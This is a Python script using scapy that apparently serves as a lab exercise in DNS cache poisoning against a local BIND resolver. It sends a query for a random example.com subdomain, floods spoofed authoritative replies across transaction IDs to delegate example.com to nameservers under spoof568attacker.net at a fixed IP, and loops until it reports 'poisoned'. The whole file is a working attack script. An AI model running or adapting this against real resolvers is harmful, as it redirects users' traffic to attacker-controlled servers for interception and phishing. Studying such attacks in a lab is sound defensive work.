#!/usr/bin/env python2
import argparse
import socket

from scapy.all import DNS, DNSQR, DNSRR
from random import randint, choice
from string import ascii_lowercase, digits


parser = argparse.ArgumentParser()
parser.add_argument(
    "--dns_port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument(
    "--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = '127.0.0.1'
# your bind's port (DNS queries are send to this port)
my_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
    return ''.join(choice(ascii_lowercase + digits) for _ in range(10))


'''
Generates random 8-bit integer.
'''
def getRandomTXID():
    return randint(0, 256)


def send_dns_query():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    domain = getRandomSubDomain() + '.example.com.'

    request = DNS(rd=1, qd=DNSQR(qname=domain))
    sock.sendto(bytes(request), (my_ip, my_port))

    for i in range(0, 2 ** 8):
        spoofed_response = DNS(id=i,
                               aa=1,
                               qr=1,
                               qd=request.qd,
                               an=(
                                   DNSRR(rrname=request.qd.qname,
                                         rdata="1.2.3.4",
                                         ttl=11920,
                                         type='A')
                               ),
                               ns=(
                                   DNSRR(rrname="example.com.",
                                         ttl=11920,
                                         rdata="ns1.spoof568attacker.net.",
                                         type='NS') /
                                   DNSRR(rrname="example.com.",
                                         ttl=11920,
                                         rdata="ns2.spoof568attacker.net.",
                                         type='NS')
                               ),
                               ar=(
                                   DNSRR(rrname="ns1.spoof568attacker.net.",
                                         ttl=11920,
                                         rdata="159.203.48.222",
                                         type='A') /
                                   DNSRR(rrname="ns2.spoof568attacker.net.",
                                         ttl=11920,
                                         rdata="159.203.48.222",
                                         type='A')
                               ))
        sock.sendto(bytes(spoofed_response), (my_ip, my_query_port))

    response = sock.recv(4096)
    response = DNS(response)

    return response.ancount == 1


if __name__ == '__main__':
    while not send_dns_query():
        pass
    print('poisoned')
